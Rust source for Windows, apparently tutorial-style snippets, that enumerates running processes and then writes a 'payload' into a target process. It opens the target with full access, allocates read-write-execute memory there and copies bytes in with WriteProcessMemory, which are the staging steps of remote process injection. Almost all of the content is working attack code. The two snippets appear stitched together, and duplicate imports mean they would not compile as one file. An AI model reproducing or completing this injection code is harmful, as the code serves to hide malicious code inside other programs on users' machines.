use std::mem;
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next,
    PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};

fn list_processes() -> Vec<(u32, String)> {
    let mut results = Vec::new();

    let snapshot = unsafe {
        CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) // 0 = snapshot all processes
    };
    if snapshot == INVALID_HANDLE_VALUE {
        eprintln!("[-] CreateToolhelp32Snapshot failed");
        return results;
    }

    let mut entry: PROCESSENTRY32 = unsafe { mem::zeroed() }; // Zero-initialise the struct
    entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;   // REQUIRED: set struct size first

    unsafe {
        if Process32First(snapshot, &mut entry) != 0 {         // Non-zero = success (BOOL)
            loop {
                // szExeFile is a [i8; 260] null-terminated C string — convert to Rust String
                let name_bytes: Vec<u8> = entry.szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)                  // Stop at null terminator
                    .map(|&c| c as u8)
                    .collect();
                let name = String::from_utf8_lossy(&name_bytes).into_owned();
                results.push((entry.th32ProcessID, name));

                if Process32Next(snapshot, &mut entry) == 0 {  // 0 = no more processes
                    break;
                }
            }
        }
        CloseHandle(snapshot);                                 // Always close handles
    }
    results
}

fn main() {
    for (pid, name) in list_processes() {
        println!("  {:>6}  {}", pid, name);
    }
}

use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};
use windows_sys::Win32::Foundation::{CloseHandle, BOOL};
use std::ptr;

fn write_to_process(pid: u32, payload: &[u8]) -> Result<*mut core::ffi::c_void, String> {
    unsafe {
        // Open a handle to the target process with full access rights
        let proc_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid); // 0 = don't inherit
        if proc_handle.is_null() {
            return Err(format!("OpenProcess failed for PID {}", pid));
        }

        // Allocate RWX memory in the target process's address space
        let remote_mem = VirtualAllocEx(
            proc_handle,
            ptr::null(),              // Let OS choose the address
            payload.len(),            // Size: exactly the payload length
            MEM_COMMIT | MEM_RESERVE, // Commit and reserve in one call
            PAGE_EXECUTE_READWRITE,   // RWX: readable, writable, executable
        );
        if remote_mem.is_null() {
            CloseHandle(proc_handle); // Clean up handle before returning error
            return Err("VirtualAllocEx failed".to_string());
        }

        // Write the payload bytes into the remote process's allocated memory
        let mut bytes_written: usize = 0;
        let write_result: BOOL = WriteProcessMemory(
            proc_handle,
            remote_mem,
            payload.as_ptr() as *const core::ffi::c_void,
            payload.len(),
            &mut bytes_written,
        );
        CloseHandle(proc_handle);     // Close handle regardless of write result

        if write_result == 0 {
            return Err(format!("WriteProcessMemory failed — wrote {} bytes", bytes_written));
        }
        Ok(remote_mem)                // Return remote address where payload now lives
    }
}

